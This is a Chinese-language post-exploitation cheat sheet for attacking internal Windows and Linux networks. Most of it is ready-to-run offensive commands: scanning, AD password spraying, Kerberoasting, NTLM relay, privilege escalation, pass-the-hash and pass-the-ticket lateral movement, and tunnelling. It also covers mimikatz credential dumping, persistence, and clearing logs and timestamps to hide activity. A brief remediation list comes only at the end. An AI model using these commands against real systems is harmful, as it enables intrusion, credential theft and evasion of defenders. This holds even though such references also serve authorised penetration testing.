# 内网与后渗透速查（扫描 / AD / 提权 / 横向 / 凭据）

## 内网扫描

- 资产探测：`nmap -sV -p- TARGET`；存活：`fscan -h 192.168.1.0/24` / `gogo`。
- 服务指纹：`nmap -sV -p 21,22,445,3389,8080,8443 TARGET`；Web 批量：`httpx -sc -title -l hosts.txt`。
- 域内发现：`ldapsearch -x -H ldap://DC -b "dc=corp,dc=local"`、BloodHound 采集。

## AD 域攻击

- 喷洒：`Spray-Passwords`（SPRAY_TEMPLATE）低速率横测；Kerberoast：`Rubeus kerberoast`。
- 委派滥用：`Get-DomainComputer` 查非约束/约束委派，`ms14-068`/`CVE-2022-26923` 类利用链。
- 中继：NTLM Relay（SMB/HTTP → LDAP）提权；`ntlmrelayx.py -t ldap://DC`。
- 快速路径：GPO 投毒、SCCM/WSUS 滥用、ADCS 模板（ESC1/ESC8）。

## 提权

- 系统：内核版本 → 对应 EXP（占位：KERNEL_EXP_SLOT）；`sudo -l` 提权项。
- 常见面：SUID（`find / -perm -4000`）、计划任务（可写脚本）、服务二进制替换、
  弱 PATH 劫持、Docker 组逃逸（`docker run -v /:/mnt`）。
- Windows：SeImpersonate（PrintSpoofer/JuicyPotato）、UAC 绕过、服务权限（`sc config`）。

## 横向移动

- PSM/SSH：`ssh ROLE_A@TARGET -i key`；RDP：`xfreerdp /v:TARGET /u:user /p:pass`。
- 隧道：`chisel client` / `frp` / `suo5` / `fscan -socks`；代理链：`proxychains nmap`。
- 传递：PTH（`psexec.py -hashes`）、PTT（`Rubeus ptt /ticket:x.kirbi`）。

## 凭据与持久化

- 内存：mimikatz `sekurlsa::logonpasswords`；缓存：浏览器密码、SSH 私钥、云 token。
- 持久化：计划任务 / 服务 / 自启动 / 注册表 / SSH authorized_keys（PERSIST_SLOT）。
- 清理：会话日志、历史命令、时间戳还原（CLEANUP_SLOT）。

## 修复要点

最小权限 + 域内监控（4688/4776/4625）、限制 NTLM、禁用危险委派、
未授权端口收敛、凭据分离与 MFA。
